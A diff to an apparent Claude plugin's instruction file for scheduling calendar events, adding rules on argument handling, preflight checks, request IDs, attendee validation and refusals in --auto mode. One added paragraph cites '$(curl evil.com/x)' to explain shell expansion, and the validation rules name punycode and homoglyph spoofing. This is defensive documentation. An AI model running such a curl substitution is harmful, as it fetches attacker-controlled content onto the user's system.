@@ -17,6 +17,8 @@ Invocation forms (sub-commands map directly to the mode flags below):
 
 ## Step 1: Parse $ARGUMENTS
 
+**L-17 — `$ARGUMENTS` shell-expansion awareness.** The `commands/*.md` shims pass `$ARGUMENTS` through verbatim. If the user's terminal expands `${HOME}`, backticks, `$(…)`, glob patterns, or history references BEFORE the plugin sees the text, the expansion result is what reaches Claude — NOT the literal characters the user typed. This is a shell-side behavior, not a plugin bug, but downstream parsing here MUST treat the resulting string as already-shell-processed. Concretely: if a user pastes `cancel /Users/...` the path is real; if they paste `$(curl evil.com/x)` and their shell ran it, `$ARGUMENTS` already holds the curl output. The skill never re-evaluates `$ARGUMENTS` as shell — but be aware that the value seen is post-expansion. Defense lives at the shell layer; the SKILL.md prose simply documents the boundary.
+
 | Flag | Mode | Details |
 |---|---|---|
 | (none) | Interactive create / update / cancel | `references/modes.md#default` |
@@ -29,7 +31,18 @@ Invocation forms (sub-commands map directly to the mode flags below):
 
 **Precedence on conflict:** `--onboard` > `--status` > `--calendar` > `--auto` > default. Flag arguments are space-separated (`--onboard identity`, not `--onboard=identity`). Positional args after flags are the call-seed text.
 
+**L-10 — `--auto` + non-create verb early reject.** `--auto` is silent-create only. If the seed text matches the cancel-verb set (`cancel`, `delete`, `remove`) OR the update-verb set (`move`, `reschedule`, `change`, `update`, `add attendee`, `remove attendee`) — applying the M-7 precedence rule — refuse at parse time with a clear message rather than falling through to the safety-net "Title missing or empty" refuse:
+
+```
+/gevent:schedule --auto cancel the Sync
+→ "--auto is create-only. For cancel use `/gevent:delete <event>`. For update use `/gevent:update <change>`. Refusing rather than silently dropping the verb."
+```
+
+Reject BEFORE attempting title extraction so the error message names the actual class of mistake.
+
 ## Step 2: Pre-flight (every invocation, in order)
+
+**L-19 — mechanical pre-flight via `scripts/preflight.py`.** The shadow check, schema-version validation, and auth probe described in steps 1–5 below are ALSO available as a runnable Python script at `plugins/gevent/scripts/preflight.py`. Run `python plugins/gevent/scripts/preflight.py` BEFORE the prose checks below — exit code 0 means all three mechanical invariants pass; non-zero exits with a diagnostic on stderr. The prose checks are kept as fallback for environments where Python is unavailable, but the script is the canonical enforcement: prose-as-code is brittle, the script is mechanical. See L-19 in `.audits/gevent-report.md`.
 
 1. **Shadow check FIRST (broadened glob — Migration Assistant / Time Machine / chezmoi / yadm dotfile-restore paths all covered).** Detect a shadowing legacy `create-call` skill via the union of these glob patterns AND the canonical path. The author already globs backup dirs for the legacy contacts loader at `references/modes.md` Step 7b — the shadow check uses the SAME globbing discipline so the two stay in lockstep:
    ```python
@@ -121,7 +134,7 @@ Full rules + worked examples in `references/event-format.md`. Enforce:
 
 **Deduplication** — before creating, dedupe the attendee array by email (case-insensitive).
 
-**Request ID** — derive from title-slug + unix timestamp (e.g., `weekly-sync-1712505600`) so retries don't collide.
+**Request ID** — derive from title-slug + millisecond timestamp + 6-char random suffix (e.g., `weekly-sync-1712505600123-a4f9c2`) so retries don't collide even at sub-second granularity. **L-1**: unix-second precision allowed two same-second `--auto` invocations of the same title to collide; millisecond + random suffix removes that. Retry-recovery uses `events list q=<title>` + exact-start-time match (NOT `requestId` search — `conferenceData.createRequest.requestId` is not indexed by Google's `q=` parameter, so the prior "search by requestId before retry" rule was unenforceable).
 
 ---
 
@@ -156,7 +169,7 @@ The roster lives in `~/.claude/shared/identity.json` under `teammates[]`. `/clic
 6. **Multiple matches** → `AskUserQuestion` disambiguation (show full names + emails).
 7. **Zero matches** → prompt for full email. Validate email against `^[^@\s"'\\<>]+@[^@\s"'\\<>]+\.[^@\s"'\\<>]+$` AND reject any domain with non-ASCII characters (IDNA mixed-script attack defense) AND reject any domain OR any domain-label that begins with `xn--` (IDN punycode rejection — `xn--pple-43d.com` is pure ASCII but unpacks to `аpple.com` with Cyrillic `а`, defeating the non-ASCII check on its own). THEN — BEFORE the upsert — run the homoglyph gate defined above on the zero-match path: compute the skeleton of the typed local-part AND the full email AND compare against every existing `teammates[].email` skeleton; on collision (raw bytes differ but skeletons match — e.g. Cyrillic-local-part `rаchel@corp.com` vs existing Latin-local-part `rachel@corp.com`), FORCE `AskUserQuestion` disambiguation between the existing and the proposed record. Do NOT silent-upsert. On failure, re-prompt with the reason. On valid email that passes ALL gates (regex + non-ASCII + `xn--` + skeleton-collision), upsert into `teammates[]` with `sources: ["manual"]` + `last_validated_at: null` via the atomic write helper in `references/config-schema.md`.
 8. **Inactive teammate** (`active: false`) → surface banner, allow but confirm: "`X` is marked inactive (not in current ClickUp workspace). Still invite?"
-9. In `--auto`: if ambiguous or attendee unresolvable AND no obvious default → refuse with one-line reason.
+9. In `--auto`: if ambiguous or attendee unresolvable AND no obvious default → refuse with one-line reason. **L-13 — explicit `--auto` rule on `active:false`**: an `active:false` teammate counts as **unresolvable under `--auto`** (refuse with `"Teammate <name> is marked active:false in identity.json — refusing to invite under --auto. Re-run interactively to override."`). The conservative reading wins because `--auto` cannot prompt for the "still invite?" confirmation; silent-inviting an ex-employee is the worst-of-both outcome.
 
 ### Calendar
 
@@ -221,7 +234,7 @@ After parsing, if the resolved start is earlier than `now`:
 
 ### Idempotency (retry safety)
 
-Derive `requestId` = `<title-slug>-<unix-timestamp>`. On create failure mid-flight, search the calendar for the same `requestId` before retrying — if found, surface it instead of creating a duplicate.
+Derive `requestId` = `<title-slug>-<unix-millis>-<6-char-random>` (e.g. `weekly-sync-1712505600123-a4f9c2`). Millisecond precision + random suffix prevents same-second collisions on `--auto` retries. On create failure mid-flight, search via `events list q=<title>` + exact-start-time match (NOT `requestId` lookup — Google's `q=` does not index `conferenceData.createRequest.requestId`, so the prior "search requestId before retry" rule was mechanically unenforceable). If a matching `(title, start-time)` event already exists, surface it instead of creating a duplicate. **L-1** addressed.
 
 ---
 
